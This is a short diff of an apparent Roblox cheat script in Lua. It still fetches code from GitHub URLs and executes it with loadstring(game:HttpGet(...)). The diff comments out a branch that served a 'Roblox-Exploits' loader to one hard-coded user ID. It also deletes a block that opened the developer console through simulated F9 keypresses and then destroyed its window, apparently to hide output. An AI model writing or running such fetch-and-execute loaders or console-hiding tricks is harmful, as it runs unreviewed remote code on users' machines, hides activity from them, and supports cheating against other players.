@@ -16,25 +16,12 @@ end
 
 local h=nil
 
-if p.UserId ~= 156256804 then
+--if p.UserId ~= 156256804 then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/main/RedCircleBlock"))()
-else
-loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
-end
+--else
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
+--end
 
-h = game.DescendantAdded:Connect(function(d)
-  if d.Name == "MainView" then
-      wait();
-      d.Parent.Parent:Destroy()
-  end
-end)
-
-task.wait(.5);
-vim:SendKeyEvent(true, "F9", 0, game)
-vim:SendKeyEvent(false, "F9", 0, game)
-task.wait(.5);
-
-if h then h:Disconnect() h=nil end
 
 game.Workspace.Effects.ChildAdded:Connect(function(j)
 wait();
